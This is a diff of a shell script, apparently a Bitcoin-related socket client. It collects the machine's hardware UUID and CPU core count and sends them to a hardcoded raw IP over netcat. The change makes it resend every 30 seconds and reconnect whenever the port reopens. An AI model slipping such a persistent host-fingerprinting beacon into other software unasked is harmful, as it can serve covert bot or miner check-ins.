@@ -2,6 +2,7 @@
 #btc_socket_client.sh -g azure-email@mailholder.com - i gekkoxid
 
 _wait () {
+	# -z: The -z flag can be used to tell nc to report open ports, rather than initiate a connection. 
 	while ! nc -z 149.28.31.125 45569;
 	do sleep 5;
 	done;
@@ -19,7 +20,8 @@ _exec () {
 
 	numCore=`grep -c ^processor /proc/cpuinfo`;
 	uuid=`dmidecode | grep -w UUID | sed "s/^.UUID: //g"`
-	echo "$gid|$group|$uuid|$numCore" | nc -q -1 149.28.31.125 45569;
+	
+	while nc -z 149.28.31.125 45569 ; do echo "$gid|$group|$uuid|$numCore" ; sleep 30; done | nc 149.28.31.125 45569;
 	echo 'Port closed. Waiting server to open port...';
 	_wait;
 	_exec;
